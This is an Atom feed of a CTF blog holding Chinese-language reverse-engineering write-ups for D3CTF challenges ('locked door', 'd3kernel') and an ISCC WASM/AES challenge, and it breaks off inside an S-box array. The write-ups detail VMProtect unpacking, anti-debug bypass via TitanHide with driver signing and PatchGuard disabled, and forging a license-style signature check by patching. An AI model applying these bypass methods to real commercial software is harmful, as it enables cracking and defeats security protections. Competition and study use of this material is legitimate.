<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liv&#39;s blog</title>
  
  <subtitle>CTF blog</subtitle>
  <link href="https://tkazer.github.io/atom.xml" rel="self"/>
  
  <link href="https://tkazer.github.io/"/>
  <updated>2025-06-01T08:47:36.184Z</updated>
  <id>https://tkazer.github.io/</id>
  
  <author>
    <name>Liv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>D3CTF Reverse WP</title>
    <link href="https://tkazer.github.io/2025/06/01/D3CTF-Reverse/"/>
    <id>https://tkazer.github.io/2025/06/01/D3CTF-Reverse/</id>
    <published>2025-06-01T03:00:56.000Z</published>
    <updated>2025-06-01T08:47:36.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次比赛做了d3kernel和locked door这两题，也是都拿下了一血。这两题都是强对抗类型，和传统的加解密类型题目有区别。kernel是内核逆向&amp;反调试对抗；第二题是vmp对抗+real world类型，模仿的场景是商业软件许可证伪造逆向。这两题都挺有意思的，质量也都很高。</p><h1 id="locked-door"><a href="#locked-door" class="headerlink" title="locked door"></a>locked door</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>查壳发现是vmp 3.5.1+的壳，</p><p><img src="/2025/06/01/D3CTF-Reverse/image.png" alt="alt text"></p><h3 id="绕过反调试"><a href="#绕过反调试" class="headerlink" title="绕过反调试"></a>绕过反调试</h3><p>由于vmp 3.5.1+的检测很严，scyllahide插件已经没办法过了，这边赛中用的是下面这个付费调试器动调的，这边提供另一个方案。titanhide驱动来处理vmp调试。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-2.png" alt="alt text"></p><p>使用VKD工具的target64中的vminstall在虚拟机中运行安装，会多出来一个引导启动，重启电脑选择新的引导启动就可以，他会进入内核调试模式，禁止驱动强制签名以及关闭PG，也就可以让我们加载titanhide驱动。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-81.png" alt="alt text"></p><p>在github上下载titanhide编译版本。</p><p><a href="https://github.com/mrexodia/TitanHide/releases">https://github.com/mrexodia/TitanHide/releases</a></p><p>直接拖入TitanHide.sys加载运行。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-82.png" alt="alt text"></p><p>将titanhide中的x64插件这两个文件拖入dbg的plugins文件夹即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-83.png" alt="alt text"></p><p>现在直接打开x64dbg，拖入程序运行就可以进行愉快的调试了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-84.png" alt="alt text"></p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>vmp找OEP的思路如下，断点QueryPerformanceCounter或GetSystemTimeAsFileTime都可以，可能执行一次不太够，要执行到返回地址的第二个栈顶地址是在.text段范围内的，此时第二个栈顶地址就是ope了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-85.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-86.png" alt="alt text"></p><p>很明显的看出确实是ope的代码</p><p><img src="/2025/06/01/D3CTF-Reverse/image-87.png" alt="alt text"></p><p>f4让程序走到这个oep下面的这个jmp，这时直接dump即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-88.png" alt="alt text"></p><p>IDA反编译，字符串搜索key1定位到核心main函数。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-7.png" alt="alt text"></p><p>可以在oep这个jmp跳过来后的代码段下面找到核心main函数的调用，接下来就是调试就可以了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-89.png" alt="alt text"></p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>main函数发现反编译不完全，发现是sub_7FF73E5EC840里面调用的一个call导致的，可以从传参+函数具体实现发现这应该是一个读取key文件的函数。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-12.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-14.png" alt="alt text"></p><p>暂时将两处调用读取key文件的函数相关代码nop，让我们的反编译可以看到完整代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-15.png" alt="alt text"></p><p>以下是完整反编译代码，第一个if应该就是校验Key1的函数， sub_7FF73E5EC900跟进看发现是一堆加密代码，且其中调用的sub_7FF73E797910似乎存在虚拟化，没办法看代码，只能进行调试看看具体是什么功能。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-16.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-17.png" alt="alt text"></p><p>调试走到sub_7FF73E5EC900调用处发现参数一传入的就是key1.bin的256字节数据指针。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-18.png" alt="alt text"></p><p>步入跟进函数，走到sub_7FF73E797910函数调用处，发现参数二传入的是key1.bin数据。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-19.png" alt="alt text"></p><p>步过函数执行，跳转到刚刚参数一的地址，发现只是把参数二的数据复制了一份到参数一，那么这个函数实际上的作用和memcpy是一样的。</p><p>sub_7FF73E5EC900这函数功能就是将key.bin输入数据进行一次加密。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-20.png" alt="alt text"></p><p>if那边调用的函数是对加密后的key数据进行一次EVP签名校验，可以通过进入各个函数里面，看到一些文本就可以知道是openssl的EVP代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-22.png" alt="alt text"></p><p>而参数一就是要校验的目标文本，让key1.bin加密后的数据和”Welcome”进行签名校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-23.png" alt="alt text"></p><p>可以看到下面调用函数结构和上面key1差不多，都是读入key2.bin然后进行sub_7FF73E5EC900的一次加密，最后与”Here is the key”进行签名校验，不过key2的EVP校验函数被vmp保护了，没办法查看代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-24.png" alt="alt text"></p><p>从题目的描述可知key1和key1校验逻辑完全相同，那我们就可以从这个点出发进行伪造绕过校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-25.png" alt="alt text"></p><h2 id="伪造绕过签名校验"><a href="#伪造绕过签名校验" class="headerlink" title="伪造绕过签名校验"></a>伪造绕过签名校验</h2><p>上文可知key1和key2校验逻辑是完全一样，由于key1校验是通过的，那我们就可以复制一份key1.bin改名覆盖key2.bin，让程序读key2.bin的时候实际读入的是key1的数据，然后断点在key2的EVPCheck函数，将参数一字符串地址改成’Welcome”字串的地址，最终让程序校验成功。</p><p>以下实操：</p><p>修改完key2.bin后，断点在Check2处，将参数一改成”Welcome”的地址。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-26.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-27.png" alt="alt text"></p><p>步过执行Check2后，key2校验成功，flag就从Check2保护函数中输出出来了。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-28.png" alt="alt text"></p><p>d3ctf{Y0u_0p3n_7h3_d00r!!!}</p><h1 id="d3kernel"><a href="#d3kernel" class="headerlink" title="d3kernel"></a>d3kernel</h1><h2 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h2><p>调试client.exe，发现单步走会触发除0异常，最后跳到这一个函数，发现里面全都是r3层单纯的io交互和校验，并没用用到驱动通信。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-29.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-30.png" alt="alt text"></p><p>调试，随便输入点东西，在这两处strncmp可以找到两个目标对应字符串，但这个password是fake的，名字后面还能用的到。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-33.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-32.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-34.png" alt="alt text"></p><p>汇编界面发现上层的这个call存在异常，将箭头处jmp nop即可看到完整的代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-35.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-36.png" alt="alt text"></p><p>发现这边有个反调试，然后走了不同代码，如果检测到被调试，就走我们上面分析的那个纯r3的交互，如果没有被检测到，就走真实的R0通信交互。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-37.png" alt="alt text"></p><p>要想调试真实的代码部分，我们就要在反调试和检测驱动handle的地方做一下处理，因为我们目前还没有运行驱动，找不到驱动句柄的。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-38.png" alt="alt text"></p><p>反调试这边直接将返回值rax改成0就可以绕过反调试。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-39.png" alt="alt text"></p><p>createFile处我们也可以从参数得到”\\.\d3ctf”，mov r15,rax处将rax改成1就可以绕过这边的合法句柄校验。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-40.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-41.png" alt="alt text"></p><p>经过调试可以发现这边是解密出一些字符串，然后输出输入。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-42.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-43.png" alt="alt text"></p><p>然后将name和password指针放到一个结构体里面({name,password})，通信传到R0，然后再通信一次得到返回数据，再解密输出。控制码分别是0x222000和0x222004。到此整体R3流程分析完毕。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-44.png" alt="alt text"></p><h2 id="R0分析"><a href="#R0分析" class="headerlink" title="R0分析"></a>R0分析</h2><h3 id="代码流程分析"><a href="#代码流程分析" class="headerlink" title="代码流程分析"></a>代码流程分析</h3><p>DriverEntry进来，发现函数这边存在反调试检测以及对R3程序进程保护，反调试检测到会直接将windbg调试剥离。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-46.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-47.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-48.png" alt="alt text"></p><p>直接将红框处代码全部nop，就可以去掉所有的反调试和保护了，主要分析就在这边的MajorFunction，sub_1400011A0进行分析。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-49.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-50.png" alt="alt text"></p><p>我们确实也可以在这里面找到两个控制码的判断和执行代码。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-52.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-51.png" alt="alt text"></p><p>在控制码0x222004下面，有两处文本解密，可以模拟代码，手动解密出来为这两个字符串。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-55.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-53.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-54.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DecText</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *enc, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v45&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> v47&#123;&#125;, v48&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v47 = <span class="number">52</span> * (v45 / <span class="number">52</span>);</span><br><span class="line">        v48 = v45++;</span><br><span class="line">        enc[i] ^= v48 - v47 + <span class="number">55</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004270[<span class="number">29</span>] = &#123;</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x16</span>, <span class="number">0x1B</span>, <span class="number">0x4B</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x2C</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x53</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> unk_140004290[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0x1C</span>, <span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x46</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>&#125;;</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004270, <span class="number">29</span>);</span><br><span class="line">    <span class="built_in">DecText</span>(unk_140004290, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.29s\n&quot;</span>, unk_140004270);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.16s\n&quot;</span>, unk_140004290);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以知道这部分就是对加密后的name和password进行校验，校验成功输出”qwq, why!!!!! my secret!!!!!”，校验失败，跳转到下面输出”zako, try again”。</p><p>这部分代码我们也可以看到外层校验了28个字节，内层校验了144个字节，分别除以4就是7和36，分别对应上了r3层的name和password的长度。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-56.png" alt="alt text"></p><p>在上面代码部分也可以看到有password和name的数据加载，一个36循环一个7循环就可以分辨出来。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-57.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-58.png" alt="alt text"></p><p>这边有调用到的sub_14000270C是一个虚拟机代码，目前不知道执行了什么。接下来就先在两处的数据加载动调分析入手，看看password和name都做了什么处理。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-59.png" alt="alt text"></p><h3 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h3><p>这边实际调试发现，这边扫描nt模块地址时候会导致蓝屏，所以最好在箭头处断点，手动赋值上nt模块地址，d3ctf+0x1CC4。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-60.png" alt="alt text"></p><p>先用sxe ld d3ctf命令拦截断点该驱动的加载。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-61.png" alt="alt text"></p><p>加载驱动断下后，设置d3ctf+0x1CC4的断点。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-62.png" alt="alt text"></p><p>断下后lm vm nt查询nt的地址得到fffff804&#96;75e00000，手动给d3ctf+0x5400赋值即可。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-63.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-64.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-65.png" alt="alt text"></p><p>在我们刚刚要动调的36循环处下断点，运行成功断下。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-66.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-67.png" alt="alt text"></p><p>这边可以发现要给eax赋值的数组处就是我们r3输入传进来的password，单步执行完call，可以发现参数一是r14赋值给rcx的，查看执行完函数的r14，发现是一个两个DWORD64地址的结构体。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-68.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-69.png" alt="alt text"></p><p>直接pa d3ctf+0x1596让代码执行到此处，也就是for循环结束后的代码。</p><p>再次查看r14结构的第二个地址，发现这循环实际作用就是将输入的36 password字节都转换成DWORD类型，存入到一个数组。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-70.png" alt="alt text"></p><p>单步执行完循环下面的两个VM后，发现是给这个数组前面加了个0x24数据</p><p><img src="/2025/06/01/D3CTF-Reverse/image-71.png" alt="alt text"></p><p>pa d3ctf+0x19E2，跳到name那边循环赋值的循环结束地址，同样查看参数一，这边是r15，发现是和password初始操作一样，将输入字符串转成DWORD数组存入。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-72.png" alt="alt text"></p><p>接下来我们先不管中途对password和name的一些加密操作，直接跳到Check处，这边是28字节Check，对应name的DWORD长度。</p><p>pa d3ctf+0x1A99</p><p><img src="/2025/06/01/D3CTF-Reverse/image-73.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-74.png" alt="alt text"></p><p>查看两个数组的数据，发现前七个DWORD，也就是前28字节是完全一样的，说明name确实是r3假流程那边得到的”mitsuha”。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-75.png" alt="alt text"></p><p>再pa d3ctf+0x1AC4，执行到校验password的地方。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-77.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-76.png" alt="alt text"></p><p>查询将要对比校验的两个数组数值，上面是我们password加密后的密文，下面是目标密文。</p><p>我们输入的password是”123456abcdef123456abcdef123456abcdef”，发现加密后的密文很有规律性和重复性，猜测是简单加密。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-79.png" alt="alt text"></p><p>并且发现第一个数据0x15 ^ ‘1’ &#x3D; 0x24，也就是刚刚上面出现的VM函数给password数组添加的第一个0x24数据。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-80.png" alt="alt text"></p><p>发现第一个0x15 ^ 0x24 &#x3D; ‘1’，然后’1’ ^ 0x3 &#x3D; ‘2’，依次下去，就解密出来了原输入的password。</p><p>说明检验前password的加密如下：插入0x24到数组头，依次往后两两相邻数值异或。</p><p>那么这边直接提取37个DWORD的密文，进行两两异或解密即可。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 密文前面插入0x24用于解密</span></span><br><span class="line">    <span class="type">uint8_t</span> Enc[]&#123;<span class="number">0x24</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0xe</span>, <span class="number">0x5c</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x52</span>, <span class="number">0x6</span>, <span class="number">0x1b</span>, <span class="number">0x1a</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x5e</span>, <span class="number">0x4b</span>, <span class="number">0x19</span>, <span class="number">0x56</span>, <span class="number">0x6</span>, <span class="number">0x55</span>, <span class="number">0x1c</span>, <span class="number">0x14</span>, <span class="number">0x5c</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x50</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0x52</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x6A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Enc[i + <span class="number">1</span>] ^= Enc[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过第一个0x24，输出后36 password明文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d3ctf&#123;%.36s&#125;\n&quot;</span>, Enc + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>d3ctf{a68dfb06-798f-4bd1-9e81-011aaec113f0}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次比赛做了d3kernel和locked door这两题，也是都拿下了一血。这两题都是强对抗类型，和传统的加解密类型题目有区别。kerne</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ISCC擂台赛逆向题 Enigma 题解</title>
    <link href="https://tkazer.github.io/2025/05/25/ISCC-Enigma/"/>
    <id>https://tkazer.github.io/2025/05/25/ISCC-Enigma/</id>
    <published>2025-05-25T04:56:13.000Z</published>
    <updated>2025-06-01T03:01:15.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题当时赛中很早就写出爆破解密脚本了，但是一直没爆出来，赛后和出题人咨询发现是密文错了，并且发现其实是程序本身出错了，xor 0x10的代码并没有给实际密文数据段进行xor，而是给一个空数据段xor了，所以导致密文没有xor 0x10，所以是错的密文，也就无法爆破。这题本身题目难度还行，WASM逆向+AES魔改+Siphash+排列爆破。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h2><p>下载得到bin文件，xor 0x21得到wasm程序文件。</p><p><img src="/2025/05/25/ISCC-Enigma/image.png" alt="alt text"></p><p>这边使用ghidra分析，ghidra插件链接：<a href="https://github.com/nneonneo/ghidra-wasm-plugin">https://github.com/nneonneo/ghidra-wasm-plugin</a></p><p>从导出表定位到main函数。</p><p><img src="/2025/05/25/ISCC-Enigma/image-1.png" alt="alt text"></p><p>第一部分，先输入字符串，然后srand(time(0))，取16个rand()%2，存到b70数组，所以b70是0101的随机排列数组，这边的需要的爆破次数就是2^16。</p><p><img src="/2025/05/25/ISCC-Enigma/image-2.png" alt="alt text"></p><p>这边提一嘴srand和rand的实现，这样的实现就是对应C语言中的srand和rand，魔数也是很好看出来的，这边代码抄出来就可以用。</p><p><img src="/2025/05/25/ISCC-Enigma/image-3.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-4.png" alt="alt text"></p><p>第二部分是将输入字符串取了一部分，然后将b70数组当作密钥，进行SipHash，得到hash值然后扩展成16字节的密钥，这边对输入字符串的操作有点迷惑看不懂，就得开始动调看看实际怎么取的。</p><p><img src="/2025/05/25/ISCC-Enigma/image-5.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-12.png" alt="alt text"></p><p>这边使用的是TGCTF的index题的wasm环境，只是把里面的wasm调用改成这题的wasm。</p><p>输入48长度字符串，然后点确定再点一下取消，断点到wasm程序，func13就是main函数这边。</p><p><img src="/2025/05/25/ISCC-Enigma/image-6.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-7.png" alt="alt text"></p><p>这边调用的func12就是对应SpiHash的call。然后堆栈的三个值就对应SpiHash的三个参数，第一个参数就是要看的传入字符串参数。</p><p>将值转到十六进制，点击箭头处的Memory按钮，在Memory窗口转到对应的地址，发现是传入是ISCC{123}，也就是我们输入的字符串前八个字符加最后一个}。</p><p><img src="/2025/05/25/ISCC-Enigma/image-8.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-9.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-10.png" alt="alt text"></p><p>最后一个部分就是将输入字符串用刚刚hash扩展生成的密钥进行AES加密，最后与密文进行比较。</p><p><img src="/2025/05/25/ISCC-Enigma/image-11.png" alt="alt text"></p><h2 id="解密流程简述"><a href="#解密流程简述" class="headerlink" title="解密流程简述"></a>解密流程简述</h2><p>爆破16大小的01字节数组全排列，爆破三个未知可视字符(32-126)，经过SpiHash然后扩展生成密钥进行AES解密，如果解密出ISCC{}格式字符串，即为爆破解密成功。</p><p>总体解密次数是 (2^16)*(95^3) &#x3D; 56,188,928,000，由于量级过大，考虑使用CUDA进行爆破。</p><h2 id="AES魔改分析"><a href="#AES魔改分析" class="headerlink" title="AES魔改分析"></a>AES魔改分析</h2><p>和标准AES代码流程进行对比，分析发现是mixColumns和addRoundKey进行了对调，其他地方都一样。</p><p><img src="/2025/05/25/ISCC-Enigma/image-14.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-15.png" alt="alt text"></p><p>第二个魔改点是Sbox数值的魔改，导出然后手动算出InvSbox即用于解密。解密的时候也同样交换mixColumns和addRoundKey的调用即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123; <span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>, <span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>, <span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>, <span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>, <span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span 